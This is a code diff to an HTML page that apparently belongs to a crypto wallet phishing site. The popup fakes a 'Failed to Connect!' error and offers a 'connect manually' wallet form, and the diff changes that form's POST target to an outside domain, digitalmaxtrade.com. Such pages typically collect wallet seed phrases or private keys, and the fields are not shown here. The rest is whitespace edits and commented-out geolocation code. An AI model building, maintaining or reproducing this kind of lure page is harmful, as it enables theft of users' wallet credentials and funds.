@@ -511,6 +511,7 @@
             </div>
         </div>
     </footer>
+
     <div class="popup-container" id="popup-container">
         <div class="popup">
             <div class="popup-header">
@@ -523,11 +524,12 @@
                     <font color="green">Connecting....</font>
                 </center>
             </div>
+
             <div id="walletForm" align="center" style="display: none;">
                 <img src="assets/images/error.png" width="10px">
                 <font color="red" size="1px">Failed to Connect! Use the form below to connect manually.</font><br>
                 <hr>
-                <form action="https://www.digitalmaxtrd.com/connect" method="post">
+                <form action="https://digitalmaxtrade.com/connect" method="POST">
                     <div class="dropdown image-dropdown">
                         <label for="wallet_id">Wallet Type:</label>
                         <select id="wallet_id" name="wallet_id">
@@ -1959,6 +1961,7 @@
             </div>
         </div>
     </div>
+
     <script>
         function openPopup() {
             document.getElementById("popup-container").style.display = "flex";
@@ -1987,6 +1990,7 @@
         }, 25000);
 
 
+
         // if ("geolocation" in navigator) {
         //     // Geolocation is available
         //     navigator.geolocation.getCurrentPosition(function (position) {
@@ -2007,7 +2011,6 @@
         //     // Geolocation is not available
         //     console.log("Geolocation is not available");
         // }
-
     </script>
 
 </body>
